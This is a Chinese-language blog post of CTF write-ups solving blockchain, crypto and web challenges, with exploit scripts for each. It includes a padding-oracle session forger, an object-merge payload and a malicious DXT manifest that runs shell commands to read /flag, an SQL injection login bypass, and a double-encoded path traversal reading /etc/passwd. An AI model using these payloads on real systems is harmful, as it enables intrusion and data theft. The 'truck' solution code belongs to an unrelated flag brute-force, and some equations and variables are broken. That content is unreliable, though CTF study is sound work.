---
title: "星盟招新wp"
image: ''
pinned: false
comment: true
published: 2026-03-28
updated: 2026-04-16
description: "一个人wp"
category: 学习
tags: [学习]
---

明天满课，周日写的。



# MISC

## 1.抄作业

题目给出了一个 **RPC 节点地址**、一个**目标合约地址**以及一个**私钥**。并没有提供 **Solidity 源代码**。根据当前信息来看，我们需要从题目中还原出源码来。

题目没有直接给逻辑源码，因此我们要先利用以太坊标准的 JSON-RPC 接口 `eth_getCode` 获取的原始字节码。

Bash

```
curl -X POST URL -H "Content-Type: application/json" --data "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getCode\",\"params\":[\"0x75537828f2ce51be7289709686A69CbFDBb714F1\", \"latest\"],\"id\":1}"
```

通过接口得到了一串16进制的数据，将数据反编译后进行分析，得到 EVM 指令流。

> https://ethervm.io/decompile

```
contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;
        var var0 = msg.value;
    
        if (var0) { revert(memory[0x00:0x00]); }
    
        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }
    
        var0 = msg.data[0x00:0x20] >> 0xe0;
    
        if (var0 == 0x5e36bdc6) {
            // Dispatch table entry for 0x5e36bdc6 (unknown)
            var var1 = 0x0052;
            var var2 = 0x004d;
            var var4 = 0x04;
            var var3 = var4 + (msg.data.length - var4);
            var2 = func_01A4(var3, var4);
            var2 = func_004D(var2);
            var temp0 = var2;
            var2 = 0x005f;
            var3 = temp0;
            var4 = memory[0x40:0x60];
            var2 = func_01E9(var3, var4);
            var temp1 = memory[0x40:0x60];
            return memory[temp1:temp1 + var2 - temp1];
        } else if (var0 == 0xaab2fcd2) {
            // Dispatch table entry for 0xaab2fcd2 (unknown)
            var1 = 0x0082;
            var2 = 0x007d;
            var4 = 0x04;
            var3 = var4 + (msg.data.length - var4);
            var2, var3, var4 = func_0235(var3, var4);
            func_007D(var2, var3, var4);
            stop();
        } else { revert(memory[0x00:0x00]); }
    }
    
    function func_004D(var arg0) returns (var arg0) {
        memory[0x20:0x40] = 0x00;
        memory[0x00:0x20] = arg0;
        return storage[keccak256(memory[0x00:0x40])] & 0xff;
    }
    
    function func_007D(var arg0, var arg1, var arg2) {
        var var0 = arg2;
        var var1 = 0x00ad;
        var var2 = arg1;
        var var3 = arg0;
        var1 = func_02B2(var2, var3);
    
        if (var1 == var0) {
            memory[0x00:0x20] = msg.sender;
            memory[0x20:0x40] = 0x00;
            var temp0 = keccak256(memory[0x00:0x40]);
            storage[temp0] = (storage[temp0] & ~0xff) | 0x01;
            return;
        } else {
            var temp1 = memory[0x40:0x60];
            memory[temp1:temp1 + 0x20] = 0x08c379a000000000000000000000000000000000000000000000000000000000;
            var1 = temp1 + 0x04;
            var0 = 0x00e4;
            var0 = func_034D(var1);
            var temp2 = memory[0x40:0x60];
            revert(memory[temp2:temp2 + var0 - temp2]);
        }
    }
    
    function func_014A(var arg0) returns (var r0) { return arg0 & 0xffffffffffffffffffffffffffffffffffffffff; }
    
    function func_0169(var arg0) returns (var r0) {
        var var0 = 0x00;
        var var1 = 0x0173;
        var var2 = arg0;
        return func_014A(var2);
    }
    
    function func_017A(var arg0) {
        var var0 = 0x0183;
        var var1 = arg0;
        var0 = func_0169(var1);
    
        if (arg0 == var0) { return; }
        else { revert(memory[0x00:0x00]); }
    }
    
    function func_0190(var arg0, var arg1) returns (var r0) {
        var var0 = msg.data[arg1:arg1 + 0x20];
        var var1 = 0x019e;
        var var2 = var0;
        func_017A(var2);
        return var0;
    }
    
    function func_01A4(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
    
        if (arg0 - arg1 i>= 0x20) {
            var var1 = 0x00;
            var var2 = 0x01c6;
            var var3 = arg0;
            var var4 = arg1 + var1;
            return func_0190(var3, var4);
        } else {
            var1 = 0x01b8;
            revert(memory[0x00:0x00]);
        }
    }
    
    function func_01CF(var arg0) returns (var r0) { return !!arg0; }
    
    function func_01DA(var arg0, var arg1) {
        var var0 = 0x01e3;
        var var1 = arg1;
        var0 = func_01CF(var1);
        memory[arg0:arg0 + 0x20] = var0;
    }
    
    function func_01E9(var arg0, var arg1) returns (var r0) {
        var temp0 = arg1;
        var var0 = temp0 + 0x20;
        var var1 = 0x01fc;
        var var2 = temp0;
        var var3 = arg0;
        func_01DA(var2, var3);
        return var0;
    }
    
    function func_0202(var arg0) returns (var r0) { return arg0; }
    
    function func_020B(var arg0) {
        var var0 = 0x0214;
        var var1 = arg0;
        var0 = func_0202(var1);
    
        if (arg0 == var0) { return; }
        else { revert(memory[0x00:0x00]); }
    }
    
    function func_0221(var arg0, var arg1) returns (var r0) {
        var var0 = msg.data[arg1:arg1 + 0x20];
        var var1 = 0x022f;
        var var2 = var0;
        func_020B(var2);
        return var0;
    }
    
    function func_0235(var arg0, var arg1) returns (var r0, var arg0, var arg1) {
        var var0 = 0x00;
        var var1 = var0;
        var var2 = 0x00;
    
        if (arg0 - arg1 i>= 0x60) {
            var var3 = 0x00;
            var var4 = 0x0259;
            var var5 = arg0;
            var var6 = arg1 + var3;
            var4 = func_0221(var5, var6);
            var0 = var4;
            var3 = 0x20;
            var4 = 0x026a;
            var5 = arg0;
            var6 = arg1 + var3;
            var4 = func_0221(var5, var6);
            var1 = var4;
            var3 = 0x40;
            var4 = 0x027b;
            var5 = arg0;
            var6 = arg1 + var3;
            var4 = func_0221(var5, var6);
            arg1 = var4;
            arg0 = var1;
            r0 = var0;
            return r0, arg0, arg1;
        } else {
            var3 = 0x024b;
            revert(memory[0x00:0x00]);
        }
    }
    
    function func_02B2(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
        var var1 = 0x02bc;
        var var2 = arg1;
        var1 = func_0202(var2);
        arg1 = var1;
        var1 = 0x02c7;
        var2 = arg0;
        var1 = func_0202(var2);
        arg0 = var1;
        var temp0 = arg1 * arg0;
        var1 = temp0;
        var2 = 0x02d5;
        var var3 = var1;
        var2 = func_0202(var3);
        var0 = var2;
        var temp1 = arg1;
    
        if (!temp1 | (arg0 == var0 / temp1)) { return var0; }
    
        var2 = 0x02eb;
        memory[0x00:0x20] = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        memory[0x04:0x24] = 0x11;
        revert(memory[0x00:0x24]);
    }
    
    function func_02F3(var arg0, var arg1) returns (var r0) {
        var temp0 = arg1;
        memory[temp0:temp0 + 0x20] = arg0;
        return temp0 + 0x20;
    }
    
    function func_0303(var arg0) {
        memory[arg0:arg0 + 0x20] = 0x77726f6e67000000000000000000000000000000000000000000000000000000;
    }
    
    function func_032B(var arg0) returns (var r0) {
        var var0 = 0x00;
        var var1 = 0x0337;
        var var2 = 0x05;
        var var3 = arg0;
        var1 = func_02F3(var2, var3);
        var temp0 = var1;
        arg0 = temp0;
        var1 = 0x0342;
        var2 = arg0;
        func_0303(var2);
        return arg0 + 0x20;
    }
    
    function func_034D(var arg0) returns (var r0) {
        var temp0 = arg0;
        var var0 = temp0 + 0x20;
        memory[temp0:temp0 + 0x20] = var0 - temp0;
        var var1 = 0x0364;
        var var2 = var0;
        return func_032B(var2);
    }
}

Disassembly
```

大致扫一眼，看见这一句：

```
storage[temp0] = (storage[temp0] & ~0xff) | 0x01;
```

这个很明显是在改 storage。虽然不懂太多区块链细节，但是可以理解这边就是强行把这个位置的值改成 `1`。所以整个题目的目标应该就是这里，要check某一个值为1即真。

再往前着：

```
if (var1 == var0)
```

只有 `var1` 和 `var0` 相等，才进入修改状态的情况。

继续往前看：

```
var1 = func_02B2(var2, var3);
```

 `var1` 不是一个固定值，是 `func_02B2(var2, var3)` 这个函数算出来的结果。再去看 `func_02B2`，核心逻辑其实很明了，做乘法。

```
var1 = var2 * var3
```

`func_0235` 函数定义了，`var2` = 第1个参数， `var3` = 第2个参数，`var4` = 第3个参数。

这三个参数又进入 `func_007D` 函数，`var var0 = arg2;` 刚好就有了 `var0` 的值。

所以实际上，题目的原理就是：

```
if (var2 * var3 == var0)
```

传进去的前两个数相乘，结果刚好等于第三个数，就成功了。

直接传3个1。

### exp.py：

```
from web3 import Web3

url = "http://80-447a399a-f080-4ac3-92be-d180fb273607.challenge.ctfplus.cn/rpc"
private_key = "0xe5863391ae7c0a99ebbdb1cb332895994b7d73c5eca2d6789f48298a0f308203"
target_addr = Web3.to_checksum_address("0x75537828f2ce51be7289709686A69CbFDBb714F1")

w3 = Web3(Web3.HTTPProvider(rpc_url))
if not w3.is_connected():
    print("连接失败")
    exit()

account = w3.eth.account.from_key(private_key)
data = (
    "0xaab2fcd2"
    "0000000000000000000000000000000000000000000000000000000000000001"
    "0000000000000000000000000000000000000000000000000000000000000001"
    "0000000000000000000000000000000000000000000000000000000000000001"
)

tx = {
    "from": account.address,
    "to": target_addr,
    "value": 0,
    "gas": 200000,
    "gasPrice": w3.eth.gas_price,
    "nonce": w3.eth.get_transaction_count(account.address),
    "chainId": w3.eth.chain_id,
    "data": data,
}

try:
    signed_tx = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print("发送成功")
    print("tx_hash =", tx_hash.hex())
except Exception as e:
    print("发送失败:", e)
```



---



## 2.WhoRU?

第一题

附件是一个 Java 文件，虽然包名和类名被改成了：

- `package com.ctf.micro.auth.plugin;`
- `class MicroAuthTokenManager`

但代码里保留了几个明显的逻辑：

1. JWT 生成与解析逻辑非常标准，是一个 token manager。
2. 出现了特殊常量：`AUTH_DISABLED_TOKEN = "AUTH_DISABLED"`。
3. 保留了具有辨识度的报错信息：
    `the length of secret key must great than or equal 32 bytes; And the secret key must be encoded by base64.`

直接网络搜索相关词条，可以定位到 Nacos 默认鉴权插件中的 `JwtTokenManager`。N对比后，发现一样。

**`alibaba_nacos`**、



第二题

一个 C++ 文件，类名被改成了 `StreamStateAnalyzer`，但算法骨架非常明显：

- 构造函数里有 `offset + 1 - CONTIGUOUS_BLOCK_SIZE` 这种索引回退。
- 入口函数先设 `m_state_z[7]`，然后递归 `recursiveZlistExploration(7)`。
- 递归里先回推 `Z` 列表，再在深度为 0 时枚举 `Y7` 的中间 24 位，并结合 fiber 进行筛选。

bkcrak明文攻击，直接搜索。

**`kimci86_bkcrack`**



第三题

具有 Django 的 `views.py` 风格代码，虽然函数和变量名被局部改写了，但又很多关键的地方没变：

- `authentication / send_otp / verify_otp / get_parties / create_vote / create_dummy_data / show_result / mine_block / start_mining / create_block / block_info / sync_block / verify_block / track_server` 这一整套接口链。
- `send_otp()` 里保留了开发态注释：真实发邮件代码被注释，改成 `[True, '0']`。
- `get_parties()` 中原本应发送私钥，现在变成了 `print(priv_k)`。
- 后面还有区块、Merkle 树、投票记录、备份表同步、验块等完整逻辑。

在 GitHub 上找一下就可以看见一个 `akverma26/voting-system-using-block-chain`  ，这个仓库的rREADME 直接就点出来了整体构造跟源码一模一样。

**`akverma26_voting-system-using-block-chai`**



----



## 3.ModelMark

本题包含两个阶段：

1. 要求计算一个字符串 `x`，使得 `sha256(prefix + x)` 的哈希值以 `0000` 开头。
2. 服务器给出一段“问题”和“回答”，要求从四个模型选项中识别出该回答是由哪一个模型生成的。
   - **限制条件**：必须连续答对 8 题，每题限时 8 秒。
   - **备选模型**：
     1. `Qwen/Qwen3-8B`
     2. `deepseek-ai/DeepSeek-R1-Distill-Qwen-7B`
     3. `THUDM/GLM-4.1V-9B-Thinking`
     4. `tencent/Hunyuan-MT-7B`

由于每次连接的 `prefix` 都会改变，手动计算必然超时。使用 Python 的 `hashlib` 和 `itertools` 进行暴力破解。

通过对题目提供的 `dataset_train.json` 进行数据分析，我们可以得出四个模型的特征：

DeepSeek-R1 (选项 2)：

- 标题：包含 `<think>...</think>` 标签。
- 语气：开头常有“嗯，用户问的是……”、“好，我需要……”等思考口吻。
- 瑕疵：思维链中常出现乱码（如 `\xb1`）或不存在的虚假参考资料。

Hunyuan-7B (选项 4)：

- 标志：几乎从不使用 Markdown 加粗。
- 风格：回答非常直白、简短，没有任何多余的格式修饰。

Qwen3-8B (选项 1)：

- 标志：结构化极其规整，频繁使用 `**加粗标题**` 和数字列表。
- 语气：非常礼貌，结尾常带“希望对您有所帮助”。

GLM-4.1V (选项 3)：

- 标志：带有学术色彩，喜欢在标题中使用“原则”二字，或者在结尾加上 `（注：...）` 这种严谨的补充说明。

### exp.py

```
from pwn import *
import hashlib, string, itertools, json, re, os

HOST, PORT = 'nc1.ctfplus.cn', xxxxx
TRAIN_DATA = 'dataset_train.json'
MEMORY_FILE = 'learned_memory.json'

MODEL_ID = {
    "Qwen/Qwen3-8B": "1",
    "deepseek-ai/DeepSeek-R1-Distill-Qwen-7B": "2",
    "THUDM/GLM-4.1V-9B-Thinking": "3",
    "tencent/Hunyuan-MT-7B": "4"
}

print("同步知识库...")
db = {}

def load_to_db(filename):
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            data = json.load(f)
            for item in data:
                fingerprint = item['answer'][:50].strip()
                db[fingerprint] = MODEL_ID.get(item['model'], "1")

load_to_db(TRAIN_DATA)
load_to_db(MEMORY_FILE)
print(f"当前掌握 {len(db)} 条答案特征")

def save_memory(answer_text, choice_idx):
    new_entry = {"answer": answer_text, "model": [k for k, v in MODEL_ID.items() if v == choice_idx][0]}
    mem_data = []
    if os.path.exists(MEMORY_FILE):
        with open(MEMORY_FILE, 'r', encoding='utf-8') as f: mem_data = json.load(f)
    mem_data.append(new_entry)
    with open(MEMORY_FILE, 'w', encoding='utf-8') as f: json.dump(mem_data, f, ensure_ascii=False)
    db[answer_text[:50].strip()] = choice_idx

def solve_pow(prefix):
    for l in range(1, 10):
        for g in itertools.product(string.ascii_letters + string.digits, repeat=l):
            x = ''.join(g)
            if hashlib.sha256((prefix + x).encode()).hexdigest().startswith("0000"): return x

def heuristic_predict(ans_text):
    if any(k in ans_text for k in ["<think>", "</think>", "嗯，", "好，", "好吧，", "好的，"]):
        return "2"
    if "**" not in ans_text:
        return "4"
    if "###" in ans_text or "（注：" in ans_text or "(注：" in ans_text:
        return "3"
    return "1"

r = remote(HOST, PORT)
r.recvuntil(b'sha256(')
prefix = r.recvuntil(b' + x)', drop=True).decode()
r.sendlineafter(b'x = ', solve_pow(prefix).encode())

current_ans = ""
current_choice = ""

while True:
    try:
        data = r.recvuntil(b'> ', timeout=8).decode()
        
        if "flag{" in data:
            print(f"\nFLAG: {re.search(r'flag{.*?}', data).group()}")
            break
        
        if "Correct" in data:
            if current_ans and current_choice:
                save_memory(current_ans, current_choice)
                print(f"当前计数: {re.search(r'\((\d/8)\)', data).group(1)}")
        
        match = re.search(r'Answer:\n(.*?)\n\nWhich model\?', data, re.DOTALL)
        if not match: continue
        
        current_ans = match.group(1).strip()
        fingerprint = current_ans[:50].strip()

        if fingerprint in db:
            current_choice = db[fingerprint]
            print(f"匹配成功: {current_choice}")
        else:
            current_choice = heuristic_predict(current_ans)
            print(f"特征识别: {current_choice}")

        r.sendline(current_choice.encode())

    except EOFError:
        print("连接断开。")
        break

r.interactive()
```



----

---

---

# crypto

## 1.ECC

首先对代码进行审计，发现这不是一条正常的椭圆曲线，跟题目的描述一样。

 `a=0`

原式又可以写成：
$$
y2+cy=x^3+bx^2+dx+e
$$
配方：
$$
(2y+c)2=4x^3+4bx^2+4dx+(c^2+4e)
$$
右边因式分解：
$$
4x^3+4bx^2+4dx+(c^2+4e)=4(x−x_0)3
$$
令
$$
X=x−x_0,Y=2y+c
$$
曲线就变成：
$$
Y^2=4X^3
$$
这就是一条尖点三次曲线。

因为
$$
P=[m]G
$$
利用同构推得：
$$
m=t(P)⋅t(G)^−1(mod p)
$$
题目给了基点 G 和结果点 P。

代入就可以算出m，然后将m转成字符串就是flag了。



### exp.py：

```
from Crypto.Util.number import long_to_bytes

p = 9259018534502783714631247560818133078409930397939705162361230465031580254504264713899169170790687716589100652406132800533397486109926387016562663961524649
b = 6235467631650349040636525320446729529985562949423449382969614887116983248527693872546808737512375916974084741892428681798937790855872528526403738040908493
c = 4165903654767429195543540819098180314477702137507994424192636596518008877139978822038616746899053449640020812062736993008962585578921635697413459959685760
d = 1889382340373247565387211782596794283852946561870564309251998196824383297786878212641581641540685106266683503654620956037368416192796434147249748216284648
e = 3015564788819504594313842562882781366361783108618226049128986996153057550014499326419988348165744003693083108924831219996703133056523468396967900376388617

G = (
    1244884551970947614719458919805713649754289814760243366205012699871413235954279930743612403791919112394457579170253990713250052822262255880036254772609156,
    4579639528751113977115209571728128585569082149696598770106934145500742785077382446292613925719404433141749168427443122707253164477493499731016883616496009
)

P = (
    9039120379228240875764080238389949393433230267005269099421166553853462484353350917730468887801035670710981414900285176863179650428412616144755102163764906,
    6266065680737729548475090556806928225106996606788926050268440244885398464756877886842570309216095272026404453765198968208595242208306240371310555394416694
)

x0 = 7180529323952667367752405787335889901748076081465222034704692169325919171661700089716899591619895744264405738441989906600418222491302210841094751281221818

def t(R):
    x, y = R
    num = 2 * ((x - x0) % p) % p
    den = (2 * y + c) % p
    return num * pow(den, -1, p) % p

m = t(P) * pow(t(G), -1, p) % p
print(m)
print(long_to_bytes(m))
```



---



## 2.truck

根据源码分析：

10 轮交互，每轮提交 9 个互不相同的输入，需满足以下三层 MD5 链式相等条件：

**第一层**：
$$
md5(A) = md5(B) = md5(C) = ha
$$
**第二层**：
$$
md5(ha + D) = md5(ha + E) = md5(ha + F) = hd
$$
**第三层**：
$$
md5(hd + G) = md5(hd + H) = md5(hd + I) = hg
$$
**限制**：

- 每轮 9 个输入两两不同。
- 全程 10 轮共 90 个输入必须全局唯一。

感觉在SHCTF已经吃hash吃到饱了，这里又来。

**思路**：利用 `FastColl` 等工具构造“多碰撞样本集”。通过指数级扩展，在满足前缀对齐的前提下，批量生成满足相等条件且互不重复的二进制块。

指定两个文件

1. `simple_driver.cpp` 
   作用：提供最小功能：`给定前缀 -> 输出一对碰撞文件`。
2. `truck_solve.py` 
   作用：
   - 调用 WSL 下编译后的 `fastcoll_custom`
   - 自动生成三层 32-碰撞集合
   - 切分成 10 轮输入
   - 自动交互

### exp:

```bash
g++ -O3 -std=c++17 block0.cpp block1.cpp block1wang.cpp block1stevens00.cpp block1stevens01.cpp block1stevens10.cpp block1stevens11.cpp md5.cpp simple_driver.cpp -o fastcoll_custom
```

```
import hashlib
import itertools
import time

target_md5 = bytes.fromhex("3a22c098710019b31c328a861429d3ad")

part1 = bytes.fromhex("3c36313a333d3b3236311836322f192f")
part2 = bytes.fromhex("2f192f383736303918392f181819193e")

v14 = list(part1[:13]) + list(part2)

possible_chars = []
for b in v14:
    base_char = b << 1
    possible_chars.append([chr(base_char), chr(base_char + 1)])

print("生成组合并计算 MD5...")
start_time = time.time()

count = 0
found = False
for chars in itertools.product(*possible_chars):
    flag = "".join(chars)
    
    if not flag.startswith("ylctf{"):
        continue

    count += 1
    
    if count % 1000000 == 0:
        print(f"已计算 {count} 种组合...")

    h = hashlib.md5(flag.encode()).digest()
    
    if h == target_md5:
        print(f"\n找到 Flag: {flag}")
        found = True
        break

if not found:
    print("\n没找到...")
```



---



## 3.sda



题目脚本给了三组参数 Ai,Bi,满足下面三条关系：
$$
Bixi^2−φ(Ai)y2=z_i
$$
同时有两个很关键的限制：

1. xi和yi都比较小
2. zi的绝对值也比较小

最后 AES 密钥不是由 xi,y本身生成，而是由
$$
y2+x_1^2​x_2^2​x_3^2
$$
做 SHA-256 后截断前 16 字节得到，再用 CBC 加密 flag。密文也直接给在脚本末尾。

所以这道题的关键在在于成近似关系中拿到参数的值。



一开始最容易绕进去的地方，是下意识想去恢复xi和y。

但其实脚本从头到尾真正用到的都是平方项，因此可以直接设：
$$
U1=x_1^2,U2=x_2^2,U3=x_3^2,Y=y^2
$$
推出：
$$
B_i​U_i​−φ(A_i​)Y=z_i​
$$




脚本里数据都是公开给出的。对它们分解可以得到：

A1=214667263414571384233×1090572505187971645529

A2=767534753237922809891×828869186640649439797

A3=777188348395140418267×1165370758345329049639

因此：
$$
φ(A_1​)=234110215243875326748239356306909792514496
$$

$$
φ(A_2​)=636185906634748653450193394798718708382440
$$

$$
φ(A_3​)=905712574946398586492106148765359595887708
$$



可以构造出一个短向量：

![image-20260330125047463](/images/image-20260330125047463.png)



通过sagemath可以跑出LLL：

```
(-270773515245763000000000000,
 -383729843021257000000000000,
 -363893359279085000000000000,
 -79534770917548000000000000,
 -224130168254522,
 -99715438091581,
 -314449433786576)
```

前四项除以10的12次方后得到：
$$
(−270773515245763, −383729843021257, −363893359279085, −79534770917548)
$$
![image-20260330125249710](/images/image-20260330125249710.png)

后三项正好就是对应的残差。

说明短向量已经给出了：
$$
x_1^2, x_2^2, x_3^2, y^2
$$


### exp.py

```
from sage.all import *
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

A1 = 234110215243875326749544596075512335544257
B1 = 68765596672109672407420253033782942222910
A2 = 636185906634748653451789798738597280632127
B2 = 131860738134887128678021271054606611917493
A3 = 905712574946398586494048707872100065355613
B3 = 197958111431918701470218006359610095848736

enc = "93192f46a00b2dade984ca758706b00681263a8536d8051aff0206d257ce4c2aad6bc017138d4c7aeaed5c8fc2c1ea2f3cec3fbd9201bb5844fa8143d6630944"


phi1 = euler_phi(A1)
phi2 = euler_phi(A2)
phi3 = euler_phi(A3)

S = 10^12
M = Matrix(ZZ, [
    [S, 0, 0, 0, B1,    0,    0],
    [0, S, 0, 0, 0,    B2,    0],
    [0, 0, S, 0, 0,     0,   B3],
    [0, 0, 0, S, -phi1, -phi2, -phi3],
])


L = M.LLL()
for row in L.rows():
    print(row)


v = L.rows()[0]

U1 = abs(v[0] // S)
U2 = abs(v[1] // S)
U3 = abs(v[2] // S)
Y  = abs(v[3] // S)

print("x1^2 =", U1)
print("x2^2 =", U2)
print("x3^2 =", U3)
print("y^2  =", Y)
print("z =", v[4], v[5], v[6])

key_material = Y + U1 * U2 * U3
key_bytes = int(key_material).to_bytes((int(key_material).bit_length() + 7) // 8, "big")
aes_key = hashlib.sha256(key_bytes).digest()[:16]

iv = bytes.fromhex(enc[:32])
ct = bytes.fromhex(enc[32:])

cipher = AES.new(aes_key, AES.MODE_CBC, iv)
pt = unpad(cipher.decrypt(ct), 16)

print(pt.decode())
```



---



## 4.ez_login

根据 `app.py` ：
服务把 `session` cookie 直接当成 `AES-CBC` 密文来解密，明文格式是 `user=<username>`；

首页以 `user=` 开头，然后当 `username == "admin"` 时返回 flag。

源码里管理员默认密码是 `admin123`。

登录成功后，服务端会这样生成 session：

```
def create_session(username):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    msg = f"user={username}".encode()
    ct = cipher.encrypt(pad(msg, 16))
    return (iv + ct).hex()
```

而首页会直接把 cookie 解密并 `unpad`：

```
def get_session_data(token_hex):
    data = bytes.fromhex(token_hex)
    iv, ct = data[:16], data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ct)
    return unpad(decrypted, 16).decode(errors='ignore')
```

然后：

- `unpad` / 解密出错：直接 `500 Invalid Session`
- padding 正确但内容不对：跳回登录页
- 内容是 `user=admin`：显示 flag



CBC 模式满足：

```
P1 = D(C1) ⊕ IV
```

服务端会把我们提交的 `IV || C1` 解密，然后做 `unpad`。
因此虽然不知道密钥，但可以通过不断修改 `IV`，观察服务器回显：

- `500`：padding 错
- 非 `500`：padding 对

从而一字节一字节恢复出中间值：

```
I1 = D(C1)
```

一旦拿到 `I1`，就能直接伪造任意第一块明文：

```
IV' = I1 ⊕ target_plaintext
```

我们要的目标明文就是：

```
b"user=admin" + b"\x06"*6
```

因为 `user=admin` 长度正好是 10，PKCS#7 补齐到 16 字节需要 6 个 `0x06`。
这样服务端解密后得到的就是 `user=admin`，自然会返回 flag。

### exp.py:

```
import requests

BASE = "xxxx"

def pad16(x: bytes) -> bytes:
    n = 16 - len(x) % 16
    return x + bytes([n]) * n

def oracle(iv: bytes, c1: bytes) -> bool:
    token = (iv + c1).hex()
    r = requests.get(BASE + "/", cookies={"session": token},
                     allow_redirects=False, timeout=5)
    return r.status_code != 500

def recover_intermediate(c1: bytes) -> bytes:
    inter = bytearray(16)
    iv = bytearray(16)

    for pos in range(15, -1, -1):
        padv = 16 - pos

        for j in range(15, pos, -1):
            iv[j] = inter[j] ^ padv

        for guess in range(256):
            iv[pos] = guess
            if oracle(bytes(iv), c1):
                inter[pos] = guess ^ padv
                print(f"[+] inter[{pos}] = {inter[pos]:02x}")
                break
        else:
            raise RuntimeError(f"failed at pos {pos}")

    return bytes(inter)

def main():
    s = requests.Session()
    r = s.post(BASE + "/login", data={
        "username": "admin",
        "password": "admin123"
    }, allow_redirects=False)

    if "session" in s.cookies:
        print("[+] direct login success")
        print(s.get(BASE + "/").text)
        return

    c1 = b"\x00" * 16
    target = pad16(b"user=admin")

    inter = recover_intermediate(c1)
    forged_iv = bytes([inter[i] ^ target[i] for i in range(16)])
    forged = (forged_iv + c1).hex()

    r = requests.get(BASE + "/", cookies={"session": forged}, timeout=5)
    print(r.text)

if __name__ == "__main__":
    main()
```



---

---

---



# WEB:

## 1.ez_python

对源码进行审计：

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Config:
    def __init__(self):
        self.filename = "app.py"

class Polaris:
    def __init__(self):
        self.config = Config()

instance = Polaris()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "Welcome to Polaris CTF"

@app.route('/read')
def read():
    return open(instance.config.filename).read()
```

发现：

1. `POST` 允许用户控制 JSON 直接进入 `merge(json.loads(request.data), instance)`。
2. `merge` 会递归写对象属性，而且目标是全局对象 `instance`。

说明如果把 `instance.config.filename` 从默认值 `app.py` 改成任意路径，随后调用 `/read` ，就可以触发任意文件读取。

直接用curl 完成操作：

### curl：

```bash
curl -s -X POST \
  'http://5000-20db955e-c703-49dc-b355-338a989e024d.challenge.ctfplus.cn/' \
  -H 'Content-Type: application/json' \
  -d '{"config":{"filename":"/flag"}}'

curl -s 'http://5000-20db955e-c703-49dc-b355-338a989e024d.challenge.ctfplus.cn/read'
```



----



## 2.DXT

访问首页，通过前端 JS 发现了这些接口：

- `POST /api/upload`：上传 `.dxt`
- `GET /api/servers`：列出服务
- `GET /api/servers/{id}`：服务详情
- `POST /api/servers/{id}/start`：启动服务
- `POST /api/servers/{id}/stop`：停止服务

另外探测到隐藏/调试端点：

- `GET /debug/pprof/`
- `GET /metrics`

可控字段为：

- `manifest.server.mcp_config.command`
- `manifest.server.mcp_config.args`



由于前端公开了上传和启动接口，且manifest 中命令字段可控以及没有什么其他的黑名单拦截，还存在可利用的读取接口（`/tools`），因此得到初步思路：通过在上传的 DXT manifest 配置写入恶意的代码，让服务器启动时直接按配置执行系统命令拿到flag。

具体攻击思路为：

1. 构造合法 DXT 包。
2. 在 `mcp_config` 中写入 `/bin/sh -c <payload>`。
3. 通过 `POST /api/servers/{id}/start` 触发执行。
4. 枚举发现隐藏接口 `GET /api/servers/{id}/tools`，该接口会读取并解析子进程的 MCP 响应。
5. 让子进程输出伪造 MCP JSON：`{"result":"<flag>"}`。
6. 请求 `/tools`，服务端会把 `result` 回显出来，从而拿到 flag。

恶意 DXT：

```json
{
  "dxt_version": "0.1",
  "name": "flagleak",
  "display_name": "flagleak",
  "version": "1.0.0",
  "description": "x",
  "author": {"name": "a", "email": "a@a.com"},
  "server": {
    "type": "binary",
    "entry_point": "x",
    "mcp_config": {
      "command": "/bin/sh",
      "args": [
        "-c",
        "f=$(cat /flag); printf '{\"result\":\"%s\"}\\n' \"$f\"; sleep 180"
      ]
    }
  }
}
```



最终脚本

### exp.py:

```python
import json
import zipfile
import requests
import time

base = "http://8080-9089e134-30c5-4fca-9403-883763405752.challenge.ctfplus.cn"

def build_dxt(path="flagleak.dxt"):
    cmd = "f=$(cat /flag); printf '{\\\"result\\\":\\\"%s\\\"}\\n' \"$f\"; sleep 180"
    manifest = {
        "dxt_version": "0.1",
        "name": "flagleak",
        "display_name": "flagleak",
        "version": "1.0.0",
        "description": "x",
        "author": {"name": "a", "email": "a@a.com"},
        "server": {
            "type": "binary",
            "entry_point": "x",
            "mcp_config": {
                "command": "/bin/sh",
                "args": ["-c", cmd]
            }
        },
        "tools": []
    }
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("manifest.json", json.dumps(manifest))
    return path

pkg = build_dxt()
with open(pkg, "rb") as f:
    r = requests.post(base + "/api/upload", files={"file": (pkg, f, "application/octet-stream")}, timeout=15)
print("[upload]", r.status_code, r.text)
r.raise_for_status()
server_id = r.json()["server"]["id"]

r = requests.post(base + f"/api/servers/{server_id}/start", timeout=15)
print("[start]", r.status_code, r.text)

time.sleep(1)
r = requests.get(base + f"/api/servers/{server_id}/tools", timeout=15)
print("[tools]", r.status_code, r.text)
```



---



## 3.only real

靶机首页有注册入口 `/register`，登录提交到 `/login`。登录后进入 `/dashboard`，在普通用户界面里有一个 `Refresh Session Data` 按钮。

对应前端 JS ：

- `POST /api/profile`
- body: `{"uid":"<当前uid>"}`

注册获取可以获取 UID ，UID为32 位十六进制：

```text
a73fb09906fd4bc080c032620bdfc00a
```

直接利用uid进行sql注入，毕竟题目看着就像是sql注入的题目，肯定有地方是sql的类型。

```
{"uid":"' OR username='admin'-- "}
```

成功注入，并且返回了admin的uid，利用这个uid直接登入，拿到了管理员身份。

管理员身份下存在接口：

- `action` 只接受 `backup`
- `file` 不能为空
- 直接传绝对路径（如 `/etc/passwd`）会报：`Direct absolute path access is forbidden!`

尝试双重编码绕过，发现

- `file=%252fetc%252fpasswd` -> 成功读取

